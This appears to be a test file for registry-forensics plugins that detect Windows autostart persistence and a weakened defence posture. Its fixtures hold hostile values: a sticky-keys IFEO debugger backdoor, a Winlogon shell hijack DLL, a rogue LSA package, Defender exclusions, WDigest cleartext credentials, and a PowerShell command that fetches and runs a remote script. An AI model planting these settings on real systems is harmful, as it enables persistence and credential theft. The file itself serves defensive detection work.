// Offense-pack plugins: autostarts (sweep + StartupApproved) and defposture.
'use strict';

const test = require('node:test');
const assert = require('node:assert');
const { loadSrc } = require('./helpers/load-src');
const { HiveBuilder } = require('./helpers/hive-builder');

const RV = loadSrc({ only: /20-view-model/ });
const { runtime } = RV.plugins;
const text = (name, hive) => RV.ui.viewModel.reportText(runtime.run(name, hive));

// 12-byte StartupApproved record: enabled (0x02) with a last-run FILETIME.
// 16-byte StartupApproved record: u32 flags, u32 unknown, 8-byte last-run FT.
const saEnabled = (date) => {
  const b = Buffer.alloc(16);
  b.writeUInt32LE(0x02, 0);
  if (date) { const ft = require('./helpers/ft-bytes').ftBytes(date); ft.copy(b, 8); }
  return b;
};
const saDisabled = () => { const b = Buffer.alloc(16); b.writeUInt32LE(0x03, 0); return b; };

test('autostarts: Run values + Winlogon + IFEO Debugger + StartupApproved correlation', () => {
  const hive = RV.reg.openHive(new HiveBuilder({ fileName: 'SOFTWARE' }).build((r) => {
    r.key('Microsoft', {}, (m) => {
      m.key('Windows', {}, (w) => w.key('CurrentVersion', {}, (cv) => {
        const run = cv.key('Run');
        run.value('Updater', 1, 'C:\\Users\\Public\\upd.exe /silent');
        run.value('OneDrive', 1, 'C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe');
        const sa = cv.key('Explorer').key('StartupApproved').key('Run');
        sa.value('OneDrive', 3, saDisabled()); // legit tool disabled → tamper signal
        sa.value('Updater', 3, saEnabled(new Date('2026-08-30T09:00:00Z')));
      }));
      m.key('Windows NT', {}, (wn) => {
        wn.key('CurrentVersion', {}, (cvn) => {
          const wl = cvn.key('Winlogon');
          wl.value('Shell', 1, 'explorer.exe, C:\\temp\\shellhijack.dll');
          wl.value('Userinit', 1, 'C:\\Windows\\system32\\userinit.exe,');
          const ifeo = cvn.key('Image File Execution Options');
          const setdbg = ifeo.key('sethc.exe');
          setdbg.value('Debugger', 1, 'C:\\Windows\\System32\\cmd.exe');
        });
      });
    });
  }).toBuffer());

  const t = text('autostarts', hive);
  assert.ok(t.includes('C:\\Users\\Public\\upd.exe /silent'), 'Run entry listed');
  assert.ok(t.includes('T1547.001'), 'MITRE tag rendered');
  assert.ok(t.includes('shellhijack.dll'), 'Winlogon Shell listed');
  assert.ok(t.includes('sethc.exe'), 'IFEO target listed');
  assert.ok(t.includes('C:\\Windows\\System32\\cmd.exe'), 'IFEO Debugger data');
  assert.ok(t.includes('disabled'), 'StartupApproved disable state shown for OneDrive');
  assert.ok(t.includes('2026-08-30'), 'StartupApproved last-run shown');
});

test('autostarts: LSA packages via SYSTEM hive ccs paths', () => {
  const hive = RV.reg.openHive(new HiveBuilder({ fileName: 'SYSTEM' }).build((r) => {
    r.key('Select', {}, (s) => s.value('Current', 4, 1));
    r.key('ControlSet001', {}, (cs) => cs.key('Control', {}, (c) => {
      const lsa = c.key('Lsa');
      lsa.value('Security Packages', 7, 'msv1_0 wdigest tspkg allinthemem.dll');
    }));
  }).toBuffer());
  const t = text('autostarts', hive);
  assert.ok(t.includes('allinthemem.dll'), 'LSA Security Packages swept');
  assert.ok(t.includes('T1101'));
});

test('autostarts: Active Setup StubPath + Netsh helpers', () => {
  const hive = RV.reg.openHive(new HiveBuilder({ fileName: 'SOFTWARE' }).build((r) => {
    r.key('Microsoft', {}, (m) => {
      m.key('Active Setup', {}).key('Installed Components', {}).key('{GUID-evil}', {}).value('StubPath', 1, 'powershell -ep bypass -f http://x/i.ps1');
      m.key('Netsh', {}).value('helper', 1, 'C:\\temp\\nshelper.dll');
    });
  }).toBuffer());
  const t = text('autostarts', hive);
  assert.ok(t.includes('-ep bypass'), 'Active Setup StubPath listed');
  assert.ok(t.includes('nshelper.dll'), 'Netsh helper listed');
});

test('autostarts: empty hive reports none', () => {
  const hive = RV.reg.openHive(new HiveBuilder().build((r) => r.key('Nothing')).toBuffer());
  const res = runtime.run('autostarts', hive);
  assert.strictEqual(res.error, null);
  assert.ok(text('autostarts', hive).includes('No autostart entries'));
});

test('defposture: Defender exclusions, WDigest, UAC verdicts', () => {
  const software = RV.reg.openHive(new HiveBuilder({ fileName: 'SOFTWARE' }).build((r) => {
    r.key('Software', {}, (sw) => {
      sw.key('Microsoft', {}, (m) => {
        const wd = m.key('Windows Defender');
        wd.value('DisableAntiSpyware', 4, 1);
        const ex = wd.key('Exclusions').key('Paths');
        ex.value('C:\\Users\\Public', 1, '5/1/2026 00:00:00');
        ex.value('C:\\temp', 1, '5/1/2026 00:00:00');
        m.key('Windows', {}).key('CurrentVersion', {}).key('Policies', {}).key('System', {})
          .value('EnableLUA', 4, 0);
      });
    });
  }).toBuffer());
  const t = text('defposture', software);
  assert.ok(t.includes('DisableAntiSpyware'));
  assert.ok(t.includes('at-risk'));
  assert.ok(t.includes('C:\\Users\\Public'), 'exclusion path listed');
  assert.ok(t.includes('C:\\temp'), 'second exclusion listed');
  assert.ok(t.includes('2 Defender exclusions'), 'exclusion count in summary');
  assert.ok(t.includes('EnableLUA'));
  assert.ok(t.includes('AT-RISK'), 'verdict totals present');
});

test('defposture: WDigest + CrashControl via SYSTEM hive', () => {
  const system = RV.reg.openHive(new HiveBuilder({ fileName: 'SYSTEM' }).build((r) => {
    r.key('Select', {}, (s) => s.value('Current', 4, 2));
    r.key('ControlSet002', {}, (cs) => cs.key('Control', {}, (c) => {
      c.key('SecurityProviders', {}).key('WDigest', {}).value('UseLogonCredential', 4, 1);
      c.key('CrashControl', {}).value('CrashDumpEnabled', 4, 0);
    }));
  }).toBuffer());
  const t = text('defposture', system);
  assert.ok(t.includes('UseLogonCredential'));
  assert.ok(t.includes('cleartext'), 'WDigest verdict text');
  assert.ok(t.includes('CrashDumpEnabled'));
  assert.ok(t.includes('anti-forensics'), 'crash-dump verdict text');
});

test('defposture: hardened verdicts counted', () => {
  const software = RV.reg.openHive(new HiveBuilder({ fileName: 'SOFTWARE' }).build((r) => {
    r.key('Software', {}, (sw) => sw.key('Policies', {}, (p) => p.key('Microsoft', {}, (m) => {
      m.key('Windows', {}).key('PowerShell', {}).key('ModuleLogging', {}).value('EnableModuleLogging', 4, 1);
      m.key('Windows', {}).key('PowerShell', {}).key('ScriptBlockLogging', {}).value('EnableScriptBlockLogging', 4, 1);
    })));
  }).toBuffer());
  const t = text('defposture', software);
  assert.ok(t.includes('EnableModuleLogging'));
  assert.ok(t.includes('hardened'), 'hardened verdict present');
});

test('defposture: MiniNt key flagged as event-log evasion', () => {
  const software = RV.reg.openHive(new HiveBuilder({ fileName: 'SOFTWARE' }).build((r) => {
    r.key('Software', {}, (sw) => sw.key('Microsoft', {}, (m) => {
      m.key('Windows NT', {}).key('CurrentVersion', {}).key('MiniNt', {});
    }));
  }).toBuffer());
  const t = text('defposture', software);
  assert.ok(t.includes('MiniNt'));
  assert.ok(t.includes('T1112'));
});
